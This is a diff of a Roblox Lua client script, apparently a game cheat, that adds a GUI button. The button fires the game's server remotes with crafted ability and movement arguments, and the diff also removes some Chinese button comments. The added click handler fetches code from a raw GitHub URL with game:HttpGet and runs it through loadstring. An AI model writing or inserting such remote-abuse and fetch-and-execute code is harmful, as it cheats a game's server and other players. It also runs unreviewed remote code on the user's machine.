@@ -11,7 +11,6 @@ local gui = Instance.new("ScreenGui")
 gui.ResetOnSpawn = false
 gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 
--- 按钮1 (原有)
 local button1 = Instance.new("ImageButton")
 button1.Size = UDim2.new(0.05, 0, 0.125, 0)
 button1.Position = UDim2.new(0.73, 0, 0.823, 0)
@@ -31,7 +30,6 @@ button1.MouseButton1Click:Connect(function()
 	movementRemote:FireServer(unpack(args))
 end)
 
--- 按钮2 (原有)
 local button2 = Instance.new("ImageButton")
 button2.Size = UDim2.new(0.05, 0, 0.125, 0)
 button2.Position = UDim2.new(0.785, 0, 0.76, 0)
@@ -63,7 +61,6 @@ button2.MouseButton1Click:Connect(function()
 	end
 end)
 
--- 按钮3 (长按按钮)
 local btn = Instance.new("ImageButton")
 btn.Size = UDim2.new(0.05, 0, 0.12, 0)
 btn.Position = UDim2.new(0.645, 0, 0.815, 0)
@@ -157,6 +154,45 @@ btn.MouseLeave:Connect(function()
 			holdConnection = nil
 		end
 	end
+end)
+
+local button3 = Instance.new("ImageButton")
+button3.Size = UDim2.new(0.055, 0, 0.13, 0)
+button3.Position = UDim2.new(0.7, 0, 0.69, 0)
+button3.BackgroundTransparency = 1
+button3.Image = "rbxassetid://133916959254281"
+button3.ImageColor3 = Color3.fromRGB(0, 140, 255)
+button3.Parent = gui
+
+button3.MouseButton1Click:Connect(function()
+	local char = LocalPlayer.Character
+	if not char then return end
+	
+	local hum = char:FindFirstChildOfClass("Humanoid")
+	if hum then
+		local anim = Instance.new("Animation")
+		anim.AnimationId = "rbxassetid://106583823734360"
+		local track = hum:LoadAnimation(anim)
+		track:Play()
+	end
+	
+	local args1 = {
+		"Viltrumite",
+		"Counter",
+		[4] = "CounterAdd",
+		char,
+	}
+	abilityRemote:FireServer(unpack(args1))
+	
+	local args2 = {
+		"Angstrom",
+		"GroundBoost"
+	}
+	movementRemote:FireServer(unpack(args2))
+	
+	task.spawn(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/NMCJSSB2/114514/refs/heads/main/%E9%A1%B9%E7%9B%AE%E5%8A%9B%E9%87%8F%E5%8F%98%E4%BD%93%E6%94%BB%E5%87%BB"))()
+	end)
 end)
 
 LocalPlayer.CharacterAdded:Connect(function()
